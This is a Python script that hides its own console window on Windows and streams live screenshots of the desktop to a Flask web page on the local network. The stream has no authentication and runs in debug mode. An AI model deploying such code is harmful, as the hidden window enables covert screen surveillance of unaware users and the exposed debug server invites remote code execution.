import socket
import pyautogui
import cv2
import win32gui
import win32console
import numpy as np
from flask import Flask, render_template_string, Response
from pynput.mouse import Controller as MouseController

# Nasconde la finestra della console
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

app = Flask(__name__)
mouse = MouseController()

def generate_frames():
    while True:
        screenshot = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
        
        # Aggiungi il cursore del mouse al frame
        x, y = mouse.position
        cv2.circle(frame, (x, y), 5, (0, 255, 0), -1)
        
        ret, buffer = cv2.imencode('.jpg', frame)
        frame = buffer.tobytes()
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n\r\n')

@app.route('/')
def index():
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Screen Streaming</title>
        <style>
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background-color: #1f1f1f;
                font-family: 'Courier New', Courier, monospace;
            }
    
            .container {
                max-width: 1300px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                border-radius: 10px;
                overflow: hidden;
            }
    
            .header {
                padding: 20px;
                background-color: #333;
                color: #fff;
                text-align: center;
            }
    
            .header h1 {
                margin: 0;
                font-size: 24px;
                font-family: 'Arial', sans-serif;
            }
    
            .video-container {
                position: relative;
                overflow: hidden;
            }
    
            .video-container img {
                width: 100%;
                height: auto;
            }
    
            .fullscreen-button {
                position: absolute;
                top: 10px;
                right: 10px;
                background-color: #333;
                color: #fff;
                border: none;
                padding: 10px;
                border-radius: 5px;
                cursor: pointer;
                font-family: 'Arial', sans-serif;
            }
        </style>
        <script>
            function toggleScreenShareFullscreen() {
                const elem = document.querySelector('.video-container img');
    
                if (elem.requestFullscreen) {
                    elem.requestFullscreen();
                } else if (elem.mozRequestFullScreen) {
                    elem.mozRequestFullScreen();
                } else if (elem.webkitRequestFullscreen) {
                    elem.webkitRequestFullscreen();
                } else if (elem.msRequestFullscreen) {
                    elem.msRequestFullscreen();
                }
            }
        </script>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>Screen Streaming</h1>
            </div>
            <div class="video-container">
                <img src="{{ url_for('video_feed') }}" alt="Screen Stream">
            </div>
            <button class="fullscreen-button" onclick="toggleScreenShareFullscreen()">Fullscreen Condivisione Schermo</button>
        </div>
    </body>
    </html>
    """
    return render_template_string(html_content)

@app.route('/video_feed')
def video_feed():
    return Response(generate_frames(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

if __name__ == '__main__':
    ip_address = socket.gethostbyname(socket.gethostname())
    app.run(host=ip_address, port=5000, debug=True)
